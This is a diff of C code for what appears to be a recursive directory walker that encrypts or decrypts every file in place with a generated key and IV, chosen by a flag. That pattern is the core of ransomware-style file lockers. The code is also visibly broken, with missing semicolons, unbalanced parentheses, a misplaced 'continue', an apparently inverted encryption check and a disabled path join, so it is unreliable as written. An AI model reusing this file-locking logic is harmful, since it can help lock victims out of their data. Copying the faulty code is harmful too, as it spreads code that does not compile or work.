@@ -74,30 +74,34 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
                     }
                     if (dir->d_type == DT_DIR{  //if dir
                         strcpy(newPath,name)
-                        strcat(newPath,"/")
+                        // strcat(newPath,"/")
+                        // to complete
                         listdir(newPath,iv,key,de_flag)
                     }
                     else {  //if not dir
-
+                        //Encrypt
+                        if (de_flag == 0){
+                            if(is_encrypted(name) == 0){
+                                continue
+                            }
+                            else{
+                                encrypt(key,iv,name);
+                            }
+                        }
+                        //Decrypt
+                        if (de_flag == 1){
+                            if(is_encrypted(name) == 1){
+                                decrypt(key,iv,name);
+                            }
+                        }
                     }
-                    printf("%s\n", dir->d_name); //testing files
-                    strcpy(newPath,rep->d_name));
+                    //printf("%s\n", dir->d_name); //testing files
+                    //strcpy(newPath,rep->d_name));
                 }
                 closedir(d);
             }
             return 0;
         }
-
-//Encrypt
-    if (de_flag == 0){
-
-
-    }
-//Decrypt
-    if (de_flag == 1){
-
-
-    }
 
 int isFile(const char* name){
     DIR* directory = opendir(name);
@@ -113,8 +117,6 @@ int isFile(const char* name){
     }
     return -1;
 }
-
-
 
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
     if(RAND_bytes(key, sizeKey) == 0) {
